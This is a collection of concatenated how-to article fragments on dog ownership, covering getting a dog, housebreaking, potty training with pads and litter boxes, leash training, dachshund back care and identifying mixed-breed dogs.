If you have a yard, ensure fences are secure and there are no holes through which your new dog can escape., Be sure you have any food, treats, toys, and grooming tools you need before you bring your new dog home. Also, have a collar ready when it gets home. Getting the essentials ahead of time ensures your dog’s transition to its new home will be as smooth as possible for everyone involved.You may still have some of these items around from when your old dog was alive. Feel free to re-use whatever you have, but make sure these items are appropriate for your new dog, especially if you got a different breed. Each breed often has specific nutritional and grooming requirements so check with your shelter staff, breeder, or veterinarian to make sure you have the right items.

, If this is a family dog, it’s important to figure out who will take care of which responsibilities before brining your new pet home. Create a schedule that shows the tasks each person is responsible for and make sure this schedule is displayed somewhere everyone in the family will see it on a daily basis., Just like people, dogs need a place they can have to themselves. This can be anything from a crate or a dog bed to a mat with a pile of blankets, as long as it is a comfortable place your dog can go for privacy and to relax. While this spot doesn’t need to be shut off from the rest of the house, family members need to understand that the dog should be left alone when it’s in this place., Whether you are using the same vet you had for your old dog or are looking for a new vet, take your new dog for a check-up shortly after brining it home. This will allow you to establish a relationship with your vet and make sure your new dog doesn’t have any health problems the shelter, breeder, or pet store missed.


Don’t wait until there is an emergency to find a vet. Finding a vet both you and your dog like early on will help cut down on stress in the event of an emergency and encourage you to take your dog for regular visits, allowing you to catch any health problems early on."

Look into dog breeds.,
Determine the costs.,
Devise a plan.",How to Get a Dog While You're a Teen2," When looking into dog breeds, it is important to take into consideration the size of your home, family members’ allergies, your family’s schedule, and the amount of time you are willing to sacrifice to care for the dog. Research different breeds’ activity levels, grooming needs, trainability, diet, and other important factors.For example, if you live in an apartment and you and your parents are away from the apartment for most of the day, look into getting a small, low maintenance breed.
If your parents do not like the idea of shedding, look into breeds that have minimal shedding.
If you are knowledgeable about different dog breeds, then you will be able to choose a dog that fits your family’s needs. This will increase the chances of your parents agreeing to you getting a dog.

, Owning a dog involves a lot of costs. There is the initial cost of purchasing the dog, plus food, grooming, entertainment, and healthcare costs, to name a few. Come up with a list of items that will need to be paid for upfront. Plan to help pay for some of the costs, as well.For example, make a list of items like food, treats, and food bowls, toys, a leash and collar, a crate, and a bed. Visit your local pet store’s website and write down how much each item costs. Total the cost and determine how much you will help pay for these initial costs.
Also, come up with a list of other potential costs that your parents will need to cover if you determine you cannot, like vaccinations, training, and grooming.

, Taking care of a dog requires a lot of time. You will need to feed, walk/exercise, groom, train, and take your dog outside for potty breaks each day. Therefore, devise a plan that outlines what time you will wake up each morning to feed your dog, when you will take your dog out for walks, and how often you will bathe and groom your dog.Also, consider how you will train your dog. Will you enroll it in an obedience class or attempt to train it yourself? These are important considerations that, if planned out ahead of time, will increase the likelihood of your parents agreeing to let you have a dog.

"
Prepare for their questions.,
Ask during a convenient time.,
Make a compromise.,
Remain calm.",How to Get a Dog While You're a Teen3," When you present the idea that you want a dog, your parents will ask a lot of questions. However, by having your answers prepared beforehand, you can make a more persuasive case. Being prepared for their questions may also be another way to show your parents that you are ready to take on the responsibility of having a dog. Questions your parents might ask are:“What kind of dog do you want?” and “Is that breed the right breed for our family’s lifestyle?”
“Who will take care of the dog?”
“What are the costs of having a dog?” and “Who will pay for these costs?”
“Will a dog distract you from your school work and other responsibilities?”
“What will happen to the dog if your grades begin to slip, or if you stop taking care of it?”
“Who will train the dog?”

, Before approaching your parents, make sure they are not busy with things like working, cooking, or taking care of a sibling. Additionally, do not approach your parents when they are in a bad mood, for example, if they are stressed or angry. Instead, wait for your parents to be in a better mood before bringing up the topic of getting a dog.Examples of appropriate times to ask are while you are out walking, while driving in the car, or after dinner.
If you want to ask, but your parents are busy, you can say, “I have something to talk about with you guys, when is a good time to talk?” or “Mom (or Dad), do have a minute? I have something to ask you.”
Additionally, you can ask for a delayed response where you give your parents time to think before they make a decision. You can say, for example, “You do not need to decide right now. Think about what I said and review the information before you decide on a yes or no.”

, If your parents are leaning towards no or are undecided, offer to make a compromise. Perhaps they are worried that you will not have time for schoolwork or other responsibilities, or that they will end up having to take care of the dog if you stop. Figure out why they are undecided and negotiate with them instead of arguing with them.If they are worried about your grades slipping, or you shirking your dog responsibilities you can say, “If my grades begin to drop, or if I cannot take care of the dog, then we can put the dog up for adoption.”

, If your parents decide on a definitive no, do not get angry and begin to yell, whine, or cry. By becoming angry, you are only proving to them that you are immature and not ready to take on the responsibility of having a dog. Instead, remain calm, and attempt to figure out why they said no.In the meantime, work on making their no a yes. For example, if they think you are immature, take on more responsibilities around the house or obtain a part-time job.
Remember, if you leave a good impression, they are more likely to say yes if you ask them in the future.

Think about your living situation.,
Have you got enough time to take care of your pet?,
Decide what kind of dog do you want!,
Visit local shelters and kennels.,
Attend puppy and dog training.,
Buy food and toys.,
Expect the unexpected.,
Remember not everybody will love your new friend.",How to Get a Dog," Do you live with other people, and do they want a dog? Do you own a home, rent an apartment or home, or live in someone else's rented or owned home? Unless you own your own house and live alone, you're going to have to ask other people if it's okay for you to have a dog. This is very important.;
, Any vet will tell you that a dog should have two walks a day, at the very least one. You may love dogs, but it is cruel to them being away all the time and having them cooped up in your backyard (however large it may be) all day.

, Dogs come in all different sizes, ages, and personalities. Considerations:


Big or small? Remember that your dog will need to have access to the outdoors to go for walks and to go to the bathroom. If you live in an apartment, that means the dog will need you to take him/her outside and will spend the rest of the time in the apartment with you...taking up space. Something that many people consider is that big dogs have shorter lives than smaller dogs.
Breed. Dog breeds are as varied in personality as they are looks. While there are no hard and fast rules to a dog's breed determining its personality, it's a good idea to read up on the traits of different breeds. It's important to note that you're unlikely to find a purebred dog at the local rescue shelter. It's equally important to note that buying a purebred dog will cost you anywhere from several hundred dollars to several thousand, whereas rescue and shelter dogs cost only the adoption fee, usually under 50 dollars, and come with medical check-ups.
Some breeds are banned from apartment complexes and other living situations or public spaces.
Good with kids? Good with small kids?
How active is the dog? Some dogs require a lot more energy and running around than others.

, Now that you've decided to get a dog, the fun of picking one out begins. Don't take the first one you see -- spend time with many dogs, check out their personalities, and wait until one picks you.

, If your dog is a puppy or an older animal with poor social and obedience skills, you'll need to take him/her to doggy training. Your local animal shelter will be able to make some good recommendations for training schools. Remember, you must attend training school with your dog -- you have to learn the proper commands and how to handle your dog for the training to be effective. Expect this to be a significant time and energy investment.

, Dogs, like kids, need to be stimulated! They'll look to you for their nourishment and entertainment. Make sure you give them food and fresh water, give them plenty of active play and walk time, and that they have toys of their very own. Their food should be tailored to age and any special needs they might have.

, Dogs are active and social pack animals, and they like to interact with humans. Expect your dog to do things that crack you up and leave you steaming mad. Remember that dogs can get sick, and it's useful to always have on hand the number of an emergency or 24-hour vet or hospital.

, Dogs should be on leashes when in public, except in designated areas like a pet store or dog park. Many people have had bad experiences with dogs, and are wary or afraid of them. Don't let your dog jump on people, or run freely to strangers.

, Maybe you can rescue and rehabilitate an older dog, or give a puppy a chance. If you can't find one locally, check at other towns. And if you can't find one there either, you might have to have one shipped in from another state.

, Play with the puppy. Is he/she energetic? Does he/she growl or bite? (However, remember that puppies will often mouth or nip on hands.) If there are litter mates, do they look healthy and are they playful and good tempered?


Briefly examine the puppy for possible health issues. Ask to see veterinarian documents.







, Here would be the time to look at cost. Are you willing to pay that much? If money is not a factor, or the price is reasonable, call the breeder/wherever you are getting the puppy/dog from, and talk to them. If you want, now would be the time to negotiate price.

, Have everything ready for the dog when they come, to make the transition easier. Now see how they react with your other animals/children. If you like what you see, then welcome your new family member home!!!!

, If there is something wrong with the puppy, consider returning it. Some shelters will take back animals with shelter-borne diseases for treatment.

Inquire at local dog shelters.,
Ask your vet for recommendations.,
Ask about buddy discounts.,
Trade with neighbors.,
Trade services.,
Ask about pro bono opportunities.",How to Get Help Housebreaking a Dog on a Limited Budget1," Dog shelters are generally kept running by volunteers. And these volunteers all have one thing in common—they love dogs! Check with your local dog shelters for recommendations on volunteers or associates looking to pick up extra work as a pet sitter. These people will likely charge less than a professional pet sitter and, because of their love of dogs, you can assume they will take good care of your pup.


There may be a wall with lists of services on it at your local shelter as well. Check to see if there are any pet sitting or training services offered at a discounted rate.;
, Your vet’s office may be able to guide you to someone who is willing to housetrain your dog at a discounted rate as well. They often have technicians or interns who have flexible schedules and may be looking to make some money on the side by performing these kinds of jobs., Much like a referral program, some professionals may offer discounts if you bring in more than one dog to their business. Maybe you have a friend who is also trying to housebreak their dog, or is in need of another service, like dog walking or extended pet sitting while they are on vacation. Ask if you can receive a discounted rate for referring other people to their business., Do you have a neighbor who also has a dog (or another animal)? Ask them if they’d be interested in working out a trade. For example, if they help you housetrain your dog, you can watch their dog while they are out of town for a few days.Look for neighbors whose work schedule is opposite yours. If you are both gone during the same hours of the day this arrangement won’t be much help.

, You can also offer to trade other services. Do you own a house cleaning or landscaping business? Or teach yoga classes on the weekends? Ask pet sitters if they’d be willing to accept a trade instead of money. Some may be willing to help you housebreak your dog at no charge or at a deep discount if you offer them free or discounted rates on your services.Make sure you get your agreement in writing, just in case. This will help cover you if the other party does not stand by their original promises.
Check websites like Craigslist for local professionals that will accept a trade instead of money.

, It’s also possible that some professionals offer some of their work pro bono, or free. Although this is not very common, if you are unable to properly housetrain your dog and can’t afford to pay someone because of extenuating circumstances (a death in the family, or debilitating accident, for example) these professionals may consider offering their services pro bono in certain cases.


Be ready and willing to explain your situation and why you can’t train your dog yourself.
There may also be a waiting list for pro bono services, as they are most likely not offered very frequently."

Use reward-based training.,
Start training your chihuahua when he or she is young.,
Decide on a specific bathroom spot from the time you bring your dog home.Decide where you want your Chihuahua to toilet.",How to Potty Train a Chihuahua1," Dogs make a positive effort to repeat behaviors that get a reward. Thus if you ask a Chihuahua to ""sit"" and it rewarded when it does, it learns that doing something which comes naturally(sitting) can earn a tasty reward. The same applies to potty training. When the dog performs a natural bodily function in a specific spot (peeing or pooping) and gets a rewards, it then tries to save up its ""efforts"" to spend them on that designated spot in order to earn a super tasty treat.


Reward-based training requires you to be on the spot when the desired behavior happens, which means you need to be home to take the dog to the toilet spot regularly.
Find a treat that your Chihuahua loves and adores, and will work hard to earn. Try a range of foods from commercial treats to chicken, cheese cubes, sausages, or hot dogs. If your dog has health issues always check in with your veterinarian first to make sure there is no health reason why it shouldn't have a certain food.;
, You can, and should, start training your dog at about 8 weeks. Training takes time, so start slowly and have patience. Remember that the older a Chihuahua gets, the harder it is to train them. So it will benefit you greatly to get started early.

, When bringing a puppy home, the first place you visit, before even setting foot indoors, is the toilet spot. Ignore the puppy's attempt to play and engage you so that he or she gets down to the business of sniffing around.


If the puppy toilets, make a super big fuss of him or her and give a treat.

Consider your lifestyle when choosing a puppy.,
Use the AKC to match a puppy to your lifestyle.,
Research the breed.",How to Find an AKC Puppy2," Many people will get any dog because they are cute. However, not all dogs fit with your lifestyle. Some dogs require a lot of physical exercise or mental stimulation, some do better in certain climates, some come with specific health problems, and others are not good with small children or other pets. Ask yourself these questions as you search for a puppy:


Can I financially support a dog?
Do I have size limits, such as yard space or the size of my home?
Do I have the capabilities to pay for extra veterinary bills, such as treating hip issues in golden retrievers?
Are there any laws against the breed I am looking at?
Can I cope with extra expenses, such as new carpeting or new furniture? Can I afford vet bills and food for my dog?

, If you have never owned a dog, or you are interested in a breed you have never owned, you may want to start with the breed selector offered by the AKC. After answering a few basic questions about your lifestyle, the AKC offers breed selections that will fit with your family.They ask your zip code, how many children and other pets you own, whether you live in a house or an apartment, how physically active you are, and how neat your house is.
The selector gives you five matches they think will fit your lifestyle. However, you may also read about all the breeds on the AKC breed page.

, No two breeds are the same. Each breed has their own strengths and weaknesses, health problems, temperament issues, activity level needs, and other needs. This means not every breed is for you. As you decide on a breed, make sure you research it to make sure you understand what is required of you as the owner.The American Kennel Club has a list of dog breeds with information to help dog owners learn more about their breed. It covers everything you will need to know to get you started.
Breeders of certain types of dogs won't allow you to buy the dog unless you understand the needs of the breed so you can properly take care of them.

Some breeds have multiple breed rescues you can consult.

, There are other websites, like PuppyFind where breeders place ads for their puppies. They list the sex, age, price, and additional information. Many of the dogs on these websites are listed as AKC registerable.Be careful buying dogs off websites. You should always see the dog before you buy it.

, Before you buy from a breeder, you should make sure you are buying from a reputable breeder. Your breeder should do all medical checkups recommended by the AKC, and they should provide all documentation of those tests upon request.

Introduce the collar.,
Try putting the collar on the dog once the dog is accustomed to the collar and knows it is a positive thing.,
Try adding the leash and go outdoors once s/he's used to that.,

Walk a few step with your dog on the lead, once your dog gets that.,
Take more steps, then repeat.,
Try it in public.",How to Lead Train a Dog or Puppy," If the dog sniffs it or shows any curiosity, provide a treat. You want the collar to be a positive thing. Do this about five times randomly throughout the day.;
, If s/he whines, cries or tries to bite the collar you've progressed too fast. Go back and reward any interest. Try keeping the collar on him/her for most of the day.

, Let the puppy or dog walk you, though, whether it be sniffing around or going in and out of trees. This teaches the dog that the collar and lead are not burdens, but times to explore. Do this every time you explore the garden

, Don't make them too big or they'll take too long to chew and after a few treats, your dog will become full and lose interest. Plus the smaller size encourages sniffing. Lead your dog along the path of treats. You should have control.

, If your dog doesn't pull or tug really hard, provide a reward. If your dog made a little pull (as in ""Oh, smells like a squirrel was here.,"" that's just curiosity. Still, don't let it become too forceful or you'll have a pulling pup.

, Gradually move more steps until you don't use treats.

, Make sure your dog's ready because you don't want any incidents.

Make it a family effort.,
Ask responsible teenagers.,
Ask retirees.,
Ask co-workers.",How to Get Help Housebreaking a Dog on a Limited Budget2," If this is a family dog, make sure everyone takes responsibility for doing their part to help housebreak it properly. Assign everyone a day or two throughout the week on which they are responsible for following the potty training schedule.


Print out a schedule and hang it on the refrigerator (or wherever it will be seen by everyone). Make sure you are specific about who is taking care of the dog on what days and what this responsibility entails.
Be consistent. Everyone needs to follow the same schedule and ensure they are giving the dog all the same instructions during its housetraining. The more consistent you are in training, the quicker your dog will learn where to go and where not to go to the bathroom., Teenagers are often trying to make some extra money by picking up after-school jobs or working over their summer break. Ask some of the kids in your family, around your neighborhood, or your friends’ children if they would be interested. You can likely find a kid who loves dogs and is willing to help you housebreak yours at a much cheaper rate than a professional.


Make sure you leave very specific directions for your helper and stress the importance of following them. Dogs that are being housebroken need to follow a strict routine to be successful.Ensure you find someone who is responsible and will do what you ask of them. Consistency is key to housetraining your dog so you need someone who will take this job seriously and show up when they are supposed to.

, You may also have a few neighbors or relatives who are retired and enjoy your dog’s company. Ask them to help you housetrain your dog. They will most likely have a flexible schedule and be responsible and trustworthy, following your schedule and directions closely.


Help them out in return. For example, you could offer to help put up or take down their Christmas lights, mow their grass, or clean out their gutters in return for their help.

, Depending on the type of job you have, you may also be able to ask a few of your co-workers for help. If you have any co-workers who work at different times than you, see if they’d be willing to stop by your house on their way to or from work to check on your dog and let it out. This can help cut down the amount of time your dog is alone before you get home and give it a chance to use the bathroom, as well as allow any accidents to be cleaned up more quickly.


If you work somewhere with a very relaxed environment, ask your boss if you can bring your dog to work with you while it is housetraining. Be sure having your dog in the office won’t affect you or your co-workers productivity negatively. If you think it might, this is probably not a good idea."

Take the dog out often.,
Take the dog out immediately after waking and after meals.,
Teach your dog to go to the bathroom on command.Decide on a cue word such as ""toilet"" or ""business"" to use when training.,
Let a puppy out throughout the night.A puppy cannot hold his or her bladder overnight and so should be offered a toilet break every 4 hours during the night.",How to Potty Train a Chihuahua2," Give the Chihuahua (adult or puppy) plenty of chances to visit the toilet spot. Even if you have a dog flap, you need to be proactive and take the dog out and put him or her on the spot. The dog won't automatically know that's where you want it to go to the bathroom without being shown.For a puppy, take him or her out every 20 minutes when its awake. If the dog toilets, then be enthusiastic and give it a treat. If it doesn't toilet, bring him or her back inside and try again 20 minutes later, but keep an extra vigilant eye on it in the meantime. You want to spot if he or she attempts to squat indoors so you can scoop it up and take it outside.Crates are a great boon when house training because it acts as the dog's den and instinct makes it less likely to soil its den. However, do not crate for hours at a time. Remember the crate should be a dog's safe place not a prison, so alternate crating with play and time on the leash.
For an adult Chi, take him or her out hourly. Set an alarm to remind you each hour.

, Food in the stomach triggers a reflex that causes the dog to move its bowel around 15 - 30 minutes after eating. Make use of this reflex by popping the Chihuahua outside after meals and waiting with him or her until it performs.Do not leave the dog unattended at the toilet spot or you will miss the magic moment and lose the chance to reward it.

, Make sure all family members know and use the same word, otherwise your Chihuahua will get confused. Once your Chihuahua has finished going to the bathroom, be sure to praise it and give a treat. This helps him or her to associate going to the toilet with that specific area and makes it eager to return there.


Activate a dog-training clicker while the dog is going to the bathroom. This makes a click-clack noise that gets associated with getting a reward. By making a click-clack whilst the dog is toileting, it marks the exact moment of the behavior you are committing to reward. Now say your cue word ""Toilet.""
Each time the dog goes to the toilet, click-clack and ""Toilet."" Over time the dog will associate the cue word ""Toilet"" with the action of peeing or pooping and know it has done a good thing.
The final step is to take the dog to the toilet spot and just say the cue word ""toilet."" The dog now knows you want him or her to defecate and will attempt to do so in order to earn a reward. If the dog doesn't try, then you have gone a step too far and will need to go back to waiting for him or her to go to the bathroom, click-clack, and say the cue word. Try the advanced stage again a few days later.
This is especially handy when it's pouring with rain or freezing out.

, However, downplay removing the puppy from its crate and keep things low key so that he or she isn't rewarded with attention that would encourage wakefulness and play.


Merely scoop the Chihuahua up and without speaking to it take it out to the toilet spot. The dog's bladder will be full so it should urinate. As soon as its finished bring it back in, pop it into its crate or bed, and settle back down to sleep yourself. All of this should be done without interacting so that he or she understands it's strictly toilet time and not play.

Keep an eye on Chihuahua in the house.,
Deal with accidents gracefully.If despite everything your Chihuahua toilets in the house, never tell him or her off.,
Remember to be patient.,
Contact a trainer.",How to Potty Train a Chihuahua3," For speedy training, be vigilant and spot signs that your Chihuahua needs to go to the bathroom and is thinking about toileting in the house. Watch for behavior such as sidling up to furniture and sniffing, or sniffing the carpet and maneuvering as if to squat. When you see that behavior immediately scoop the dog up and pop it outside on to the toilet spot.It can help to keep the Chihuahua on a leash in the house, so that it can't wander off to a quiet corner and indulge itself in a spot of illicit peeing.
When it's not possible to be with the dog, put it into its crate. However, you need to be sure to observe the 20 minute toilet break rule for pups and 1 hour for adults., All this teaches the dog is that you have an irrational dislike of its bodily functions. This could make the dog more devious (it will hide to go to the bathroom) and actually sets potty training back because the dog may become fearful to toilet in front of you, even on the designated spot.


Instead, bite your tongue and wait for the Chihuahua to wander off. Then clean up thoroughly using an enzymatic cleaner. The enzymatic cleaner gets rid of all traces of urine or poo so there is no scent mark for him or her to return to. Do not use household cleaners containing bleach or ammonia, since these are components of urine and can amplify the scent and draw the dog back to that spot.
If Chi has already established an inappropriate place to toilet then clean it up with enzymatic cleaner and put its food and water bowls there. Dogs do not foul where they eat, so this will help to break that habit.

, Do not be violent or shout at your chihuahua. Instead, be loving and supportive. Your chihuahua will need time to get potty trained. Just continue to be consistent and don't get angry if your dog doesn't go to the bathroom on command right away.


If the dog goes potty where it's supposed to, remember to reward it with treats. This will help to reinforce the desired behavior.
Don't change the potty place every week or else the dog will be confused.
If the puppy goes in the wrong place, be gentle, don't be angry because it happens.

, If potty training is not working and you have been at it for quite awhile, try contacting a trainer. Look for a training program that will work for both you and your dog. Getting professional help is the best option when in a position like this.

This will establish a routine for both you and your dog. Your dog needs to go out first thing in the morning, after meals and play times, and before bedtime. Every moment should be accounted for. The schedule will vary depending on your dog's age — figure your dog can hold their bladder for one hour for each month of age, plus one hour. So a two-month-old pup can wait three hours max; a three-month-old pup can wait four hours max, and so on. This is a sample schedule for someone who is home all day and a dog who is about three months old:7:00 a.m.: Wake up and take dog to the toileting area
7:10 – 7:30 a.m.: Free time in kitchen — Let them play unsupervised for 15 – 20 minutes when you know they have an empty bladder/bowel
7:30 a.m.: Food and water
8:00 a.m.: Toilet area (Always after eating/drinking)
8:15 a.m.: Free time in kitchen
8:45 a.m.: Crate confinement

8:30 p.m.: Free time in kitchen
9:00 p.m.: Crate confinement
11:00 p.m.: Toilet area and crate confinement overnight;
, Select a place in your house that is suitable for your dog’s toileting. Ideally, this is a place with easy-to-clean floors such as a bathroom or kitchen area. Place a puppy pad here.


You need to be the one to choose the toilet spot. You need to be okay with its location when it’s indoors. For example, you might not want to put a puppy pad in your kitchen if you don’t want to have dog poo and pee near where you cook and eat.Use consistent language to refer to this place. For example, when your dog reaches this spot, say, “Go potty,” or use a similar verbal cue. Then your dog will associate this spot with toileting.

, At a scheduled potty time, or when you recognize your dog’s cues for needing to relieve himself, take him to the puppy pad.


You might want to take him on a leash, even if he’s inside. This will get him used to the leash, which you may need when you start your outdoor potty training.

, Make sure to clean up after your dog relieves himself. Dogs will want to relieve themselves where they smell their urine, so you should leave a used puppy pad with a bit of urine underneath a clean puppy pad. Remove all feces from the area after the dog relieves himself., Pay close attention to your dog so that you learn when he has to go. This might include the dog walking around stiffly or in circles, sniffing the floor like he’s searching for somewhere to pee, or letting his tail rest in a strange position.


If your dog looks like he needs to relieve himself, take him out to his designated spot right away. Do this even if you’re not at your scheduled potty break., You need to keep a vigilant eye on your dog whenever he is out of his crate. Even if he’s in the kitchen during his free time, you still need to watch him. This will ensure that you catch him before he has an accident. It’s imperative during this time that your dog associates toileting with going to his puppy pad.You might consider tethering your dog to your waist with a leash when he is out of his crate. This way, you will be sure to keep him very close to you. You can track his movements more closely., If your dog has an accident in the house, clean it up as soon as possible. You don’t want your dog relieving himself anywhere but on the puppy pad.


Don’t use an ammonia-based cleaner. Urine has ammonia in it, so your dog might associate the cleaner’s smell with urinating. Instead, use an enzymatic cleaner on soiled areas.Don’t punish your dog for having an accident.

, Your goal is to get your dog out the door when he needs to relieve himself. When your dog can consistently use the puppy pad area, then you can start integrating outdoor training into the mix. Move the puppy pad a little closer to the door every day. Do this incrementally, moving it a few feet every day.


Praise the dog every time he uses the puppy pad. Give him a pat and use a friendly voice.
If your dog is having accidents after you’ve moved the pad, you may be moving too quickly. Move the pad back and wait another day before moving it again., Once your dog is successfully using the pad in the location where you’ve moved it, you should start getting him used to toileting outside. He will get used to being out in the fresh air when relieving himself, even if it’s still on the puppy pad., Plan a space where you would like your dog to relieve himself. This might be a patch of grass or near the base of a tree. When your dog needs to go out, bring a pad with you so that your dog will associate the outdoor place with the pad.

, Once your dog is using the pad outside, you can stop setting out the pad for him. He will use the outdoor patch instead.

, If you want your dog to have the option of relieving himself indoors or outdoors, then you can set up the toileting area inside again.

, Keep your dog familiar with both the indoor and outdoor potty spots by taking him to each one. Alternate between both for a couple of weeks so that he is accustomed to using both.

, When your dog has relieved himself, either indoors or outdoors, give him lots of attention and pats. Say, “Good dog!” and other praise. Have a little celebration with your dog. This lets your dog know that its behavior is remarkable and deserves praise., When your dog has finished relieving himself, give him praise right away. You want to be sure that he associates the praise with the action that he just did. Otherwise, he might get confused about what he’s being praised for.

, Don’t use a harsh tone with your dog while you’re house training him. You don’t want him to feel scared or anxious about going outside or relieving himself.


Don’t yell at your dog if he has an accident.

, Your dog is learning how to follow your instructions. Be patient with him. Don’t rub his face in his waste.Don’t yell or shout at your dog. Don’t hit your dog. If you’re not patient and friendly, your dog may associate fear and punishment with toileting.


If you catch your dog in the middle of an accident, make a loud noise or clap to startle him. Then he will stop urinating or defecating, and you can take him to his designated toileting area to finish up.

The sides should be low enough that your dog can enter by himself, but high enough to stop your dog from peeing out of the box if he lifts his leg.
If you buy a box with a hood, consider cutting the top off to make the box easier for your dog to use and for you to clean.;
, Dog litter works best because it has larger pellets that are more absorbent. Dog litter ranges from simple clay to those with activated charcoal to control odor. For your own odor control, simply sprinkle baking soda on the bottom of the box each time before you fill it., You need to remove your dog’s waste every time he eliminates in the box, if possible. Having a scoop and trashcan nearby will make this much easier., You want the box near the places your dog spends most of his time, but also out of the way enough that you’re not watching him.


Don’t place the box near your dog’s food and water, as dogs will not eliminate where they eat.
Be aware that dogs have a tendency to dig in their box, especially at first. Place it so that any litter thrown out during digging will not cause too much of a mess., Your cat needs to feel ownership of his box, or he will start peeing outside the box to mark his territory. And if you have two dogs, it’s best to get each of them their own box to avoid similar issues with territoriality., Before your puppy or adult dog learns to eliminate in his litter box, he’ll need to be able to enter it on his own. You need to teach him that it is a safe, even fun space., Praise the dog for being in the box.

, Repeat your command, and again, praise your dog and act happy that he is in the box. Keep practicing until you are able to guide your dog into the box while giving the “use the box” command.

, Once your dog is comfortable being guided into the box, try using only your verbal command. Be patient and don’t repeat yourself. If your dog does not get in, simply walk away and try again later, or go back to guiding. If your dog does get in on command, praise him profusely. Keep practicing until he gets in immediately on command.

, Punishing your dog for peeing or pooping outside his litter box will only scare her and make it harder for him to learn. Consistency is the best way to train your dog.

, This will show your dog that it is ok to eliminate there and make him more likely to do so., Remove the food between meals. Regular feedings will lead to regular times when your dog needs to eliminate., Whining, pacing, sniffing around the house, or walking to the door are all signs that your dog needs to pee or pooh. Send him to the litter box immediately.

, All puppies should be sent first thing in the morning, just before you go to bed, and before they are confined or left alone.A puppy can usually hold his pee for the same number of hours as his age in months during the day.
Puppies can hold their pee longer at night. A 4 month old puppy should be able to make it through the night

, You don’t want your dog to get in the habit of eliminating in the house, so whenever he is not confined, watch him closely. Pacing, whining, circling, sniffing, and leaving the room are all signs that your dog needs to pee or poop. Get him to the litter box as quickly as possible., Use a small room with the door closed or blocked off by a baby gate. Locate the litter box in the room so that your dog can use it as needed., During litter training, you should always go to the litter box with your dog. Reward peeing or pooping with praise, treats, or play. , Dogs don’t bury their waste like cats do. You’ll need to scoop it out every time they pooh. At least once a month, empty the box out entirely and clean it. Your dog won’t want to use it if it gets too dirty., You don’t want to scare your dog, and you definitely don’t want to rub his face in the mess. Clap sharply in order to startle him; this will usually cause him to stop. Then quickly run with him to the litter box, encouraging him to follow you. If your dog finishes peeing or pooping in the box, give a reward. If he has nothing left, don’t worry about it."

Be aware that dachshunds are prone to intervertebral disc disease (IVDD).,
Help your dachshund to maintain a healthy weight.,
Learn how to hold your dachshund.,
Help your dachshund go up and down stairs.,
Keep your dachshund from jumping on furniture and other high places.,
Use a harness to walk your dachshund.",How to Take Care of a Dachshund1," Like some other small breeds of dog, dachshunds have a higher risk of developing intervertebral disc disease. In IVDD, the cushioning between your dachshund’s vertebrae bursts or bulges out, which places stress on the vertebrae. IVDD can cause pain, bladder control problems, and even paralysis. To help reduce your dachshund’s risk of developing IVDD, you will need to take certain precautions. You should also know how to recognize the symptoms of IVDD in your dachshund to determine when there may be a problem. Contact your dachshund’s vet immediately if you notice any of the following symptoms:


change in activity level, not jumping or running anymore
having trouble standing
crying out in pain
change in behavior, acting anxious, nervous
hunching back and neck and/or tensing back and neck muscles
eating less or not at all
losing control of bladder and/or bowels;
, Being overweight will put your dachshund at a much higher risk of developing IVDD, so it is important to feed him right and help him get plenty of exercise. To determine if your dachshund is at a healthy weight, stand over him and look down. If you can see his ribs, he is too thin and needs to gain some weight. If you cannot see his ribs but you can feel them when you touch his sides, then he is a healthy weight. If you cannot see or feel his ribs, he is overweight. Your dachshund should also have a tapered waist rather than a belly that hangs down.Talk to your veterinarian to determine how much weight he needs to lose or gain. Your veterinarian can also tell you how much to feed your dachshund to help him attain and maintain a healthy weight.
Walk your dachshund and play with him every day.
Give treats in moderation.
Consider feeding your dachshund a weight maintenance food if he becomes too heavy.

, Holding your dachshund the right way will also help protect his back. To hold your dachshund, support your dachshund’s rear end with one hand and place another hand under his belly to support his back. You may want to practice with something light before you hold your dachshund.


Never hold your dachshund with one hand only or by the paws or head.

, Climbing stairs puts pressure on your dachshund’s back and over time it may cause your dachshund to develop IVDD. Typical stairs are too tall for dachshunds to go up and down without causing stress on their backs. To avoid this problem, always carry your dachshund when you'd like him to come upstairs or downstairs.Put a baby gate up to keep your dachshund from going up and down the stairs.
Consider installing ramps for small staircases that your dachshund must go up and down every day., Jumping also puts a significant amount of pressure on your dachshund’s back and may increase his risk of IVDD. To eliminate this risk factor, do not allow your dachshund to jump up on high places such as onto the sofa or your bed. If you want your dachshund to get up on your lap, lift him up yourself. Do not encourage him to jump up.


Consider getting some furniture ramps if you want your dachshund to be able to get onto furniture when you are not around., If your dachshund tends to pull when you take him for a walk, he is causing extra stress on his vertebrae which may lead to him developing IVDD. Attaching your dachshund’s leash to a harness instead of to his collar will help reduce the stress on his neck and eliminate another factor of IVDD."

Check your dog's size.,
Look at your dog's ears.,
Check your dog's tail.,
Look at your dog's head.,
Realize you won't be able to identify your dog 100 percent.",How to Identify Your Adopted Mutt1," Your dog's size is related to your dog's breeds. You can't have a large mutt without him having a large-breed dog as a part of his genetic makeup.For instance, if your dog is very small (in the 5 to 10 pound range), he likely has some influence from the toy breeds, such as Toy Poodles, Chihuahuas, Papillons, and Shih Tzus.If your dog is mid-range, in the 10 to 50 pound range, he likely has some influence from a mid-range size dog, such as a terrier or spaniel.Large dogs, in the 65 to 100-pound range, include dogs such as setters, retrievers, and shepherds.The biggest dogs, the ones that come close to 200 pounds, likely have some giant dog in their mix, such as Saint Bernard, Komondor, or Mastiff.Nonetheless, mutts can come in any size, and if your dog is mid-range, it may be harder to determine what breeds contributed to his genetic makeup based on size.;
, Different breeds have different types of ears. Your mutt's ears can be an indicator of what breeds contributed to his looks.Bat ears are large ears that stand upright on a dog's head. They are large in proportion to the head. They may be slightly rounded. Chihuahuas and Cardigan West Corgis have these ears.Prick ears stand upright and are pointed. You'll see these ears on malamutes and Siberian Huskies, as well as some terriers. Sometimes, prick ears are made by cutting part of the ear, and those ears are called cropped. Great Danes and Doberman Pinschers often have their ears cropped. Another variation on prick ears is hooded ears, which curve slightly in at the bottom, like on Basenji dogs.Round-tip or blunt-tip ears are upright ears that are rounded on the ends, seen on Chow Chows or French Bulldogs.Candle flame ears are pointed ears, but they pinch in slightly at the bottom, making them look like a candle flame. English Toy Terriers have these ears.Button ears stand up, but the top part flops down, covering the ear canal. They're seen in Fox Terriers and Jack Russell Terriers, for example.Cocked, semi-cropped, or semi-pricked ear stands upright, but folds just slightly over at the top, as seen in Rough Collies and Pit Bulls.Drop ears or pendant ears drop down beside the side of the face, such as in the basset hound.Another type of ear that is usually a drop style is a v-shaped ear, which is a elongated ear in a triangle shape, seen in Bull Mastiffs.A folded ear is much like a drop ear. However, the ear hangs down in ruffles 